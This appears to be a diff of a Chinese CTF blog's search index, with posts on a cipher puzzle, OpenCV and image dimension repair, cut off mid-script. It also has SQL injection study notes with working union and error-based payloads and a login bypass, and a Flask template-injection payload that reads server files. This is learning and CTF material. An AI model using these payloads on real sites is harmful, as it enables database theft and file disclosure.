-<p>​        其中的version()就是我们想要查询的内容，可以换成其他我们想查的，如database()等,floor是将rand值转化为整型，即只取0,1（必不可少），我们所需要知道的信息就全都在报错语句里。（如下图）</p>
-<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s3.png" alt="s3"></p>
-<p>5.5.20即为数据库版本号，在错误信息里输出了<br>        在version这个地方就是我们要双注入的地方了，之所以叫双注入就是因为在这里要在查询一次，payload如下(例子)<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select group_concat(table_name) from information_schema.tables where table_schema=database()))</code><br>        这时候使用group_concat肯能导致查询数据太长查不出啦，可以在后面加<br>limit 0,1来限制返回行数，第一个数字代表第几行开始，第二个数字代表查几行如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select table_name from information_schema.tables where table_schema=database() limit 0,1))</code><br>        不报错就可能是查完了，当group by两个都错的时候他就会以一种奇特的方式运行，反到可以查出数据来，所以这时就确定了有几个表<br>        注意双注入要多试几次因为rand可能随机到一样的，直到报错为止</p>
-]]></content>
-      <categories>
-        <category>学习记录</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bugku-黄道十二宫</title>
-    <url>/2021/02/19/bugku-%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/</url>
-    <content><![CDATA[<p>开局拿到一张图片，大致看了下没啥隐写，根据题目名字百度了黄岛十二宫密码，发现是个杀手密码，完全没见过(⊙ˍ⊙)</p>
-<p>具体的话可以参考<a href="https://www.bilibili.com/video/av585626175/" target="_blank" rel="noopener">https://www.bilibili.com/video/av585626175/</a> 这个视频</p>
-<p>简单说就是每次往下移动一位，再右移两位，得到结果直接丢azdecrypt就行</p>
-<p>贴个写的辣鸡脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">'hd.txt'</span>)</span><br><span class="line">con = f.readlines()</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">print(con)</span><br><span class="line">r = []</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">s = open(<span class="string">'solve.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">136</span>):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">14</span>:</span><br><span class="line">        i = i - <span class="number">15</span></span><br><span class="line">    res += con[j][i]</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(res) % <span class="number">9</span> == <span class="number">0</span>:</span><br><span class="line">        i = m % <span class="number">9</span> + m // <span class="number">9</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line">print(len(res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res) // <span class="number">15</span>):</span><br><span class="line">    s.write(res[i * <span class="number">15</span>:i * <span class="number">15</span> + <span class="number">15</span>] + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res) // <span class="number">9</span>):</span><br><span class="line">    print(res[i * <span class="number">9</span>:i * <span class="number">9</span> + <span class="number">9</span>])</span><br></pre></td></tr></table></figure>
-
-<p>这里的hd.txt就是把图片上的一个个打出来，如下</p>
-<blockquote>
-<p>%,,@<em>&gt;@?==%88%5<br>,@%#@@90-7$^=</em>@<br>17,(&gt;()1@##-$40<br>~,<em>6?#%#8#=75+1<br>(</em>@<em>1%#&gt;,0@5)%?<br>%</em>^=)&amp;&gt;=1%,+7&amp;#<br>8681(+8<em>@@(,@@@<br>#</em>=#$3<em>#%,#%%,3<br>,</em>+7,7+@===+)61</p>
-</blockquote>
-<p>把得到结果solve.txt丢azdecrypt里面就出答案了</p>
-<p><img src="/2021/02/19/bugku-%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/hd1.png" alt="hd1"></p>
-<p>最后答案</p>
-<blockquote>
-<p>flag{alphananke}</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>writeup</category>
-      </categories>
-      <tags>
-        <tag>bugku</tag>
       </tags>
   </entry>
   <entry>
@@ -606,6 +555,30 @@
       </tags>
   </entry>
   <entry>
+    <title>SQL注入一</title>
+    <url>/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/</url>
+    <content><![CDATA[<h3 id="1-sql注入步骤开始清晰（整型注入）"><a href="#1-sql注入步骤开始清晰（整型注入）" class="headerlink" title="1.sql注入步骤开始清晰（整型注入）"></a>1.sql注入步骤开始清晰（整型注入）</h3><p>​        union select 的作用是将两次查询结果和为一次再输出，先用union select *，*，*…等来判断字段列数，无报错及说明字段名猜测成功，之后再让前面查询的id查不出来（id输入很大或者可以and 0），即可只显示union select的内容。前台返回结果并不是表真实列数，再查看哪个字段有回显，即前台显示的是哪几个字段内容。</p>
+<p>​        Mysql所有内容都存储于information_schema库中，里面有三个重要字段schemamata(存放所有数据库信息schema_name)，tables(存放所有数据库中的表名 table_name，table_schema表所属数据库名)，columns(存放前包含前两者的东西加上字段名column_name，内容最为详细).<br>​        Group_concat语句用于将所有查询出来的内容拼为一行，不然只会显示一个数据，如<code>Group_concat（schema_name）</code><br>​        Database（）用于查询当前数据库名称，如<code>select 1,database(),3 from information_schema.schemata（可以不加from）</code><br>​        知道数据库之后可以开始查询当前数据库所有表名，语句为 <code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code><br>​        知道表名后可以开始查询当前表中所有字段名，语句为<code>select group_concat(column_name) from information_schema.columns where table_schema=database() and tablename=xxx(自己想查的表)</code><br>​        知道字段名称可以开始查数据了,语句为select 1,group_contact(字段名)，3 from 查出来数据库名.表名<br>​        Contact_ws函数用于将两个字段一起显示，例 <code>concat_ws(‘:’,user,pwd)</code>就是将两个字段以冒号分隔一起显示，想显示所有再在外面加<code>group_concat(concat_ws(&#39;:&#39;,user,pwd))</code><br>​        快速判断几列可以用order by，原理：order by x(数字)将会按照第x列来进行排序，超过了便会报错，所以能够快速确定列数</p>
+<h3 id="2-基于报错的GET单引号双引号注入"><a href="#2-基于报错的GET单引号双引号注入" class="headerlink" title="2.基于报错的GET单引号双引号注入"></a>2.基于报错的GET单引号双引号注入</h3><p>​        在id=x后面加单（双引号）观察是否会报错，根据报错语句来实行注入，让我们自己的语句能够闭合（加单双引号，括号等），同时将后面的语句注释掉，一般可以用的方式有加/**/(基本用不上)，–+（加号等于空格），%23（#的url编码，直接输入不会被转义所以要这样），从而实现注入</p>
+<h3 id="3-基于报错的POST单引号双引号注入"><a href="#3-基于报错的POST单引号双引号注入" class="headerlink" title="3.基于报错的POST单引号双引号注入"></a>3.基于报错的POST单引号双引号注入</h3><p>（以前写的，仅针对当时看的例子，很多地方表述不清，见谅）</p>
+<p>​        一般为登陆界面，也是单双引号，不能在url中输入，需要在账户名密码中进行注入，在username中进行注入是，由于不知道账户是否存在，应该在username里闭合后加上 or 1，让其永远为真 ，这里的注释符号跟上面相同，但要多试几次，因为可能会被url转义，#可以直接用，不再需要变成23%，注释掉后sql语句中便不再判断密码，即可登陆成功（在用hackbar的时候passwd一般不能少）</p>
+<h3 id="4-基于报错的POST双注入"><a href="#4-基于报错的POST双注入" class="headerlink" title="4.基于报错的POST双注入"></a>4.基于报错的POST双注入</h3><p>​        由于有时候加只加单引号或者双引号不能根据报错得到我们想知道的东西，所以有时候需要单双引号一起用，再根据报错来判断sql语句，实现注入。<br>​        知道用户名的情况下可以不用加or 1，就会登陆到当前用户名账户。使用之前的方式，发现order by判断列数成功后，union select却不回显数据，就需要 用到双注入。<br>​        先自己尝试，在mysql中自己查询数据发现</p>
+<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s1.png" alt="s1"></p>
+<p>​        group by之后直接查询所有数据只会返回分类后的第一条。<br>​        Group by 后面如果加数字，那么就是根据select中的东西作为主键，如下图</p>
+<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s2.png" alt="s2"></p>
+<p>Group by 1就是以table_schema作为主键，2就是count（*）<br>        使用group by * 会新生成一个临时表，临时表中*为主键，不能重复，所以利用这一特性，可以用rand函数实现注入，让其出错，从而从报错信息中获取数据，具体payload如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),version());</code> </p>
+<p>​        其中的version()就是我们想要查询的内容，可以换成其他我们想查的，如database()等,floor是将rand值转化为整型，即只取0,1（必不可少），我们所需要知道的信息就全都在报错语句里。（如下图）</p>
+<p><img src="/2020/06/22/SQL%E6%B3%A8%E5%85%A5%E4%B8%80/s3.png" alt="s3"></p>
+<p>5.5.20即为数据库版本号，在错误信息里输出了<br>        在version这个地方就是我们要双注入的地方了，之所以叫双注入就是因为在这里要在查询一次，payload如下(例子)<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select group_concat(table_name) from information_schema.tables where table_schema=database()))</code><br>        这时候使用group_concat肯能导致查询数据太长查不出啦，可以在后面加<br>limit 0,1来限制返回行数，第一个数字代表第几行开始，第二个数字代表查几行如下<br><code>Union select table_schema,count(*) from information_schema.tables group by concat(floor(rand()*2),(select table_name from information_schema.tables where table_schema=database() limit 0,1))</code><br>        不报错就可能是查完了，当group by两个都错的时候他就会以一种奇特的方式运行，反到可以查出数据来，所以这时就确定了有几个表<br>        注意双注入要多试几次因为rand可能随机到一样的，直到报错为止</p>
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfhub-ssrf-post</title>
     <url>/2020/09/23/ctfhub-ssrf-post/</url>
     <content><![CDATA[<p><strong>转载自csdn的<a href="https://blog.csdn.net/rfrder/article/details/108589988" target="_blank" rel="noopener">bfengj</a>师傅</strong></p>
@@ -639,46 +612,30 @@
       </tags>
   </entry>
   <entry>
-    <title>opencv小记</title>
-    <url>/2021/02/24/opencv%E5%B0%8F%E8%AE%B0/</url>
-    <content><![CDATA[<p>此次学习原因是F5杯阿狸大大大师傅的一个爆破png宽高的图，此题crc改成的错误宽高的crc，并且删掉了几个像素块，所以直接改宽高必然得不到图片，需要用到opencv中的高斯消噪处理之类的东西，我也完全不懂，只能浅显的学习下opencv的一些简单操作</p>
-<p>先贴个狸师傅的源码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">'flag.png'</span>)</span><br><span class="line"><span class="comment"># t = img.shape</span></span><br><span class="line"><span class="comment"># t1 = img.reshape(-1)</span></span><br><span class="line"><span class="comment"># t2 = img.reshape(-1, 1)</span></span><br><span class="line"><span class="comment"># t3 = img.reshape(-1, 1, 3)</span></span><br><span class="line">img = img.reshape(<span class="number">-1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># t1 = img.shape</span></span><br><span class="line">totPoints = img.shape[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">mins = <span class="number">1e10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgauss</span><span class="params">(w)</span>:</span></span><br><span class="line">    tp = totPoints - totPoints % w</span><br><span class="line">    <span class="comment"># t = img[0,0,:]</span></span><br><span class="line">    <span class="comment"># t = img[:tp, :, :]</span></span><br><span class="line">    <span class="comment"># t = t.reshape(-1,w)</span></span><br><span class="line">    <span class="comment"># t = t.reshape(-1,w,3)</span></span><br><span class="line">    src = img[:tp, :, :].reshape(<span class="number">-1</span>, w, <span class="number">3</span>) <span class="comment">#更改宽高</span></span><br><span class="line">    gauss = cv2.GaussianBlur(src, (<span class="number">3</span>, <span class="number">3</span>), <span class="number">3</span>) <span class="comment">#(3, 3)表示高斯矩阵的长与宽都是3，标准差取3</span></span><br><span class="line">    gaussedge = cv2.Canny(gauss, <span class="number">0</span>, <span class="number">50</span>)</span><br><span class="line">    ge = np.sum(gaussedge)</span><br><span class="line">    <span class="keyword">return</span> ge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.trange(<span class="number">10</span>, <span class="number">2000</span>, <span class="number">1</span>):</span><br><span class="line">    now = getgauss(i)</span><br><span class="line">    x.append(i)</span><br><span class="line">    y.append(now)</span><br><span class="line">    <span class="keyword">if</span> now &lt; mins:</span><br><span class="line">        <span class="comment"># print(x[-1])</span></span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        mins = now</span><br><span class="line">        tp = totPoints - totPoints % i <span class="comment">#更改宽高</span></span><br><span class="line">        src = img[:tp, :, :].reshape(<span class="number">-1</span>, i, <span class="number">3</span>)</span><br><span class="line">        plt.cla()</span><br><span class="line">        plt.imshow(src)</span><br><span class="line">        plt.imsave(<span class="string">'123.png'</span>, src)</span><br><span class="line">        plt.pause(<span class="number">0.1</span>)</span><br><span class="line">plt.show()</span><br><span class="line">plt.plot(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+    <title>bugku-黄道十二宫</title>
+    <url>/2021/02/19/bugku-%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/</url>
+    <content><![CDATA[<p>开局拿到一张图片，大致看了下没啥隐写，根据题目名字百度了黄岛十二宫密码，发现是个杀手密码，完全没见过(⊙ˍ⊙)</p>
+<p>具体的话可以参考<a href="https://www.bilibili.com/video/av585626175/" target="_blank" rel="noopener">https://www.bilibili.com/video/av585626175/</a> 这个视频</p>
+<p>简单说就是每次往下移动一位，再右移两位，得到结果直接丢azdecrypt就行</p>
+<p>贴个写的辣鸡脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">'hd.txt'</span>)</span><br><span class="line">con = f.readlines()</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">print(con)</span><br><span class="line">r = []</span><br><span class="line">j = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">s = open(<span class="string">'solve.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">136</span>):</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">14</span>:</span><br><span class="line">        i = i - <span class="number">15</span></span><br><span class="line">    res += con[j][i]</span><br><span class="line">    i += <span class="number">2</span></span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> len(res) % <span class="number">9</span> == <span class="number">0</span>:</span><br><span class="line">        i = m % <span class="number">9</span> + m // <span class="number">9</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line">print(len(res))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res) // <span class="number">15</span>):</span><br><span class="line">    s.write(res[i * <span class="number">15</span>:i * <span class="number">15</span> + <span class="number">15</span>] + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res) // <span class="number">9</span>):</span><br><span class="line">    print(res[i * <span class="number">9</span>:i * <span class="number">9</span> + <span class="number">9</span>])</span><br></pre></td></tr></table></figure>
 
-
-
-<p>引用方法</p>
-<p>需要和numpy一起引用</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure>
-
-<p>读取图片</p>
- <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cv2.imread(<span class="string">'flag.png'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>imread返回的是一个三维矩阵，代表的是每个像素的信息</p>
-<p>我们通过cv2读图片时，数据读取的通道顺序是bgr，并且是height， width， channel的排列方式。</p>
-<p><code>img.shape</code></p>
-<p><code>&lt;class &#39;tuple&#39;&gt;: (419799, 5, 3)</code></p>
-<p>从img.shape中可以看出，三维数组的形状，第一维是高度，第二维是宽度，第三维是每个像素点的信息</p>
-<p><code>np.reshape(-1,1,3)</code></p>
-<p>reshape用于转换矩阵，第一个-1表示将当前矩阵无论几维都转成一维，第二个1表示将矩阵再转为二维，列数为1，第三个3表示将矩阵转为三维，列数3，以此类推，加几个参数即转为几维度，数字表示列数</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gauss = cv2.GaussianBlur(src, (<span class="number">3</span>, <span class="number">3</span>), <span class="number">3</span>) </span><br><span class="line"><span class="comment">#(3, 3)表示高斯矩阵的长与宽都是3，标准差取3</span></span><br><span class="line">gaussedge = cv2.Canny(gauss, <span class="number">0</span>, <span class="number">50</span>)</span><br><span class="line">ge = np.sum(gaussedge)</span><br></pre></td></tr></table></figure>
-
-<p>高斯消噪处理，算法方面的，完全不懂，暂时先知道怎么用吧</p>
-<p>(3, 3)表示高斯矩阵的长与宽都是3，最后的3表示标准差取3</p>
-<p>cv2.Canny表示进行canny边缘检测，也完全不懂</p>
-<p><code>np.sum</code>用于矩阵求和</p>
-<p>这个大概意思就是进行高斯消噪处理后对于边缘的数据求和，小于特定值就更新min，同时输出，即可能为正常图片</p>
-<p>这里的初始值就设为了1e10</p>
-<p><code>tqdm</code>为是一个显示处理时进度条的模块，简单用法如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.trange(<span class="number">100000000000</span>):</span><br><span class="line">    s += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>也可以参考 <a href="https://blog.csdn.net/zkp_987/article/details/81748098" target="_blank" rel="noopener">https://blog.csdn.net/zkp_987/article/details/81748098</a></p>
+<p>这里的hd.txt就是把图片上的一个个打出来，如下</p>
+<blockquote>
+<p>%,,@<em>&gt;@?==%88%5<br>,@%#@@90-7$^=</em>@<br>17,(&gt;()1@##-$40<br>~,<em>6?#%#8#=75+1<br>(</em>@<em>1%#&gt;,0@5)%?<br>%</em>^=)&amp;&gt;=1%,+7&amp;#<br>8681(+8<em>@@(,@@@<br>#</em>=#$3<em>#%,#%%,3<br>,</em>+7,7+@===+)61</p>
+</blockquote>
+<p>把得到结果solve.txt丢azdecrypt里面就出答案了</p>
+<p><img src="/2021/02/19/bugku-%E9%BB%84%E9%81%93%E5%8D%81%E4%BA%8C%E5%AE%AB/hd1.png" alt="hd1"></p>
+<p>最后答案</p>
+<blockquote>
+<p>flag{alphananke}</p>
+</blockquote>
 ]]></content>
       <categories>
-        <category>学习记录</category>
+        <category>writeup</category>
       </categories>
       <tags>
-        <tag>open-cv</tag>
+        <tag>bugku</tag>
       </tags>
   </entry>
   <entry>
@@ -766,6 +723,144 @@
       </tags>
   </entry>
   <entry>
+    <title>opencv小记</title>
+    <url>/2021/02/24/opencv%E5%B0%8F%E8%AE%B0/</url>
+    <content><![CDATA[<p>此次学习原因是F5杯阿狸大大大师傅的一个爆破png宽高的图，此题crc改成的错误宽高的crc，并且删掉了几个像素块，所以直接改宽高必然得不到图片，需要用到opencv中的高斯消噪处理之类的东西，我也完全不懂，只能浅显的学习下opencv的一些简单操作</p>
+<p>先贴个狸师傅的源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">'flag.png'</span>)</span><br><span class="line"><span class="comment"># t = img.shape</span></span><br><span class="line"><span class="comment"># t1 = img.reshape(-1)</span></span><br><span class="line"><span class="comment"># t2 = img.reshape(-1, 1)</span></span><br><span class="line"><span class="comment"># t3 = img.reshape(-1, 1, 3)</span></span><br><span class="line">img = img.reshape(<span class="number">-1</span>, <span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="comment"># t1 = img.shape</span></span><br><span class="line">totPoints = img.shape[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">mins = <span class="number">1e10</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getgauss</span><span class="params">(w)</span>:</span></span><br><span class="line">    tp = totPoints - totPoints % w</span><br><span class="line">    <span class="comment"># t = img[0,0,:]</span></span><br><span class="line">    <span class="comment"># t = img[:tp, :, :]</span></span><br><span class="line">    <span class="comment"># t = t.reshape(-1,w)</span></span><br><span class="line">    <span class="comment"># t = t.reshape(-1,w,3)</span></span><br><span class="line">    src = img[:tp, :, :].reshape(<span class="number">-1</span>, w, <span class="number">3</span>) <span class="comment">#更改宽高</span></span><br><span class="line">    gauss = cv2.GaussianBlur(src, (<span class="number">3</span>, <span class="number">3</span>), <span class="number">3</span>) <span class="comment">#(3, 3)表示高斯矩阵的长与宽都是3，标准差取3</span></span><br><span class="line">    gaussedge = cv2.Canny(gauss, <span class="number">0</span>, <span class="number">50</span>)</span><br><span class="line">    ge = np.sum(gaussedge)</span><br><span class="line">    <span class="keyword">return</span> ge</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.trange(<span class="number">10</span>, <span class="number">2000</span>, <span class="number">1</span>):</span><br><span class="line">    now = getgauss(i)</span><br><span class="line">    x.append(i)</span><br><span class="line">    y.append(now)</span><br><span class="line">    <span class="keyword">if</span> now &lt; mins:</span><br><span class="line">        <span class="comment"># print(x[-1])</span></span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        mins = now</span><br><span class="line">        tp = totPoints - totPoints % i <span class="comment">#更改宽高</span></span><br><span class="line">        src = img[:tp, :, :].reshape(<span class="number">-1</span>, i, <span class="number">3</span>)</span><br><span class="line">        plt.cla()</span><br><span class="line">        plt.imshow(src)</span><br><span class="line">        plt.imsave(<span class="string">'123.png'</span>, src)</span><br><span class="line">        plt.pause(<span class="number">0.1</span>)</span><br><span class="line">plt.show()</span><br><span class="line">plt.plot(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>引用方法</p>
+<p>需要和numpy一起引用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure>
+
+<p>读取图片</p>
+ <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cv2.imread(<span class="string">'flag.png'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>imread返回的是一个三维矩阵，代表的是每个像素的信息</p>
+<p>我们通过cv2读图片时，数据读取的通道顺序是bgr，并且是height， width， channel的排列方式。</p>
+<p><code>img.shape</code></p>
+<p><code>&lt;class &#39;tuple&#39;&gt;: (419799, 5, 3)</code></p>
+<p>从img.shape中可以看出，三维数组的形状，第一维是高度，第二维是宽度，第三维是每个像素点的信息</p>
+<p><code>np.reshape(-1,1,3)</code></p>
+<p>reshape用于转换矩阵，第一个-1表示将当前矩阵无论几维都转成一维，第二个1表示将矩阵再转为二维，列数为1，第三个3表示将矩阵转为三维，列数3，以此类推，加几个参数即转为几维度，数字表示列数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gauss = cv2.GaussianBlur(src, (<span class="number">3</span>, <span class="number">3</span>), <span class="number">3</span>) </span><br><span class="line"><span class="comment">#(3, 3)表示高斯矩阵的长与宽都是3，标准差取3</span></span><br><span class="line">gaussedge = cv2.Canny(gauss, <span class="number">0</span>, <span class="number">50</span>)</span><br><span class="line">ge = np.sum(gaussedge)</span><br></pre></td></tr></table></figure>
+
+<p>高斯消噪处理，算法方面的，完全不懂，暂时先知道怎么用吧</p>
+<p>(3, 3)表示高斯矩阵的长与宽都是3，最后的3表示标准差取3</p>
+<p>cv2.Canny表示进行canny边缘检测，也完全不懂</p>
+<p><code>np.sum</code>用于矩阵求和</p>
+<p>这个大概意思就是进行高斯消噪处理后对于边缘的数据求和，小于特定值就更新min，同时输出，即可能为正常图片</p>
+<p>这里的初始值就设为了1e10</p>
+<p><code>tqdm</code>为是一个显示处理时进度条的模块，简单用法如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.trange(<span class="number">100000000000</span>):</span><br><span class="line">    s += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以参考 <a href="https://blog.csdn.net/zkp_987/article/details/81748098" target="_blank" rel="noopener">https://blog.csdn.net/zkp_987/article/details/81748098</a></p>
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>open-cv</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flask学习</title>
+    <url>/2020/08/14/flask%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<p>就主要就记录下flask模板注入的一些payload</p>
+<p>切片法，省去了一个个找的步骤</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">`&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].open(<span class="string">'txt.galf_eht_si_siht/'</span>[::<span class="number">-1</span>],<span class="string">'r'</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; `</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>flask</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow-misc入门-31-50</title>
+    <url>/2021/04/04/ctfshow-misc%E5%85%A5%E9%97%A8-31-50/</url>
+    <content><![CDATA[<h1 id="misc31"><a href="#misc31" class="headerlink" title="misc31"></a>misc31</h1><p>老套路，同misc24，算出bmp像素数再算下宽度改了即可，这里是487202/3/150，最后宽度1082，除不尽没事，应该是后面故意多加了几个字节</p>
+<p>想了解bmp的可以看看这篇文章<a href="https://zhuanlan.zhihu.com/p/260702527" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/260702527</a></p>
+<p>也贴一个最普通的爆破bmp宽度的脚本，爆破完得自己手动找(ˉ▽ˉ；)…</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">f = open(<span class="string">'./misc31/misc31.bmp'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">width = c[<span class="number">18</span>:<span class="number">22</span>]</span><br><span class="line">height = c[<span class="number">22</span>:<span class="number">26</span>]</span><br><span class="line"><span class="comment"># 爆破bmp宽度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">900</span>,<span class="number">1100</span>):</span><br><span class="line">    f1 = open(<span class="string">'./bpout/'</span>+str(i)+<span class="string">'.bmp'</span>,<span class="string">'wb'</span>)</span><br><span class="line">    <span class="comment"># print(struct.pack('&gt;i',i)[::-1])</span></span><br><span class="line">    img = c[:<span class="number">18</span>]+struct.pack(<span class="string">'&gt;i'</span>,i)[::<span class="number">-1</span>]+c[<span class="number">22</span>:]</span><br><span class="line">    f1.write(img)</span><br><span class="line">    f1.close()</span><br></pre></td></tr></table></figure>
+
+<h1 id="misc32"><a href="#misc32" class="headerlink" title="misc32"></a>misc32</h1><p>老套路，爆破png宽度，网上随便搜一堆，不讲了，贴个腊鸡脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4096</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">4096</span>):</span><br><span class="line">        c = bytes.fromhex(<span class="string">'4948445200000384000000960802000000'</span>)<span class="comment">#ihdr段不包括crc</span></span><br><span class="line">        ihdr = c[:<span class="number">4</span>]+struct.pack(<span class="string">'&gt;i'</span>,i)+struct.pack(<span class="string">'&gt;i'</span>,j)+c[<span class="number">12</span>:]</span><br><span class="line">        crc = <span class="number">0xE14A4C0B</span></span><br><span class="line">        <span class="keyword">if</span> zlib.crc32(ihdr) == crc:</span><br><span class="line">            